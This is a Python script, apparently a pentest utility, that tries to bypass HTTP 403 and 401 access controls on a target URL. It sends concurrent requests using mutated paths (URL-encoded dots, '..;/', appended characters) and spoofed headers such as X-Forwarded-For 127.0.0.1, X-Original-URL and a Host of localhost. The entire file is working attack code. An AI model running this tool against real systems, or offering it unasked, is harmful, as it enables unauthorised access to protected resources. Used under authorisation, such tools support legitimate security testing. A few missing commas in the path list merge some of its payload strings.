#!/usr/bin/env python3
import argparse
import requests
from urllib.parse import urlparse
from termcolor import colored
import concurrent.futures

parser = argparse.ArgumentParser(description='403 & 401 Bypass tool!')
parser.add_argument('-u', '--url', type=str, required=True, help='target URL with a path or subdirectory specified.')
args = parser.parse_args()

print(colored('''    /|     |                   
   /_|_\/\/|~~\\  /|~~\/~~|(~(~
     | /\/\|__/ \/ |__/\__|_)_)
               _/  |           ''', 'blue'))
print(colored('\t\t\tgithub.com/Ryukudz', 'red'))
url = args.url
parsed_url = urlparse(url)
base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
domain = parsed_url.netloc

original_path = parsed_url.path.strip('/')
custom_paths = [
    f'{original_path}',
    f'/{original_path}//',
    f';/{original_path}',
    f'{original_path}.json',
    f'{original_path}.css',
    f'{original_path}.',
    f'{original_path}/.'
    f'{original_path}..',
    f'{original_path}/dontexist',
    f'{original_path}/test.js',
    f'{original_path}/test.css',
    f'%2e/{original_path}',
    f'%ef%bc%8f{original_path}',
    f'%252e**/{original_path}'
    f'/%2e{original_path}',
    f'{original_path}..;/',
    f'{original_path}'.upper(),
    f'{original_path}/?test',
    f'{original_path}/*',
    f'{original_path}%20',
    f'{original_path}%22',
    f'{original_path}%27',
    f'{original_path}#',
    f'{original_path}/#'   
]

headers_list = [
    {'X-rewrite-url': f'/{original_path}'},
    {'X-Custom-IP-Authorization': '127.0.0.1'},
    {'X-Original-URL': f'/{original_path}'},
    {'X-Originating-IP': '127.0.0.1'},
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Forwarded': '127.0.0.1'},
    {'Forwarded-For': '127.0.0.1'},
    {'X-Remote-IP': '127.0.0.1'},
    {'X-Remote-Addr': '127.0.0.1'},
    {'X-ProxyUser-Ip': '127.0.0.1'},
    {'X-Original-URL': '127.0.0.1'},
    {'Client-IP': '127.0.0.1'},
    {'True-Client-IP': '127.0.0.1'},
    {'Cluster-Client-IP': '127.0.0.1'},
    {'X-ProxyUser-Ip': '127.0.0.1'},
    {'Host': 'localhost'},
    {'Host': '127.0.0.1'},
    {'Host': 'example.com'},
    {'Host': f'example.{domain}'}   
]

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}


def send_request(url, headers=None, verify_ssl=True):
    response = requests.get(url, headers=headers or headers, verify=verify_ssl)
    status_code = response.status_code
    if headers:
        print(f"{url} + Header: {headers} = ", end='')
    else:
        print(f"{url} ", end='')
    if 200 <= status_code < 300:
        print(colored(f"{status_code}", 'green'))
    elif 300 <= status_code < 400:
        print(colored(f"{status_code}", 'blue'))
    elif 400 <= status_code < 600:
        print(colored(f"{status_code}", 'red'))

with concurrent.futures.ThreadPoolExecutor() as executor:
    futures = [executor.submit(send_request, url, headers) for headers in headers_list] + [executor.submit(send_request, f"{base_url}/{path}") for path in custom_paths]
    try:
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
    except KeyboardInterrupt:
        print("Ctrl + C pressed. Cancelling...")
        for future in futures:
            future.cancel()


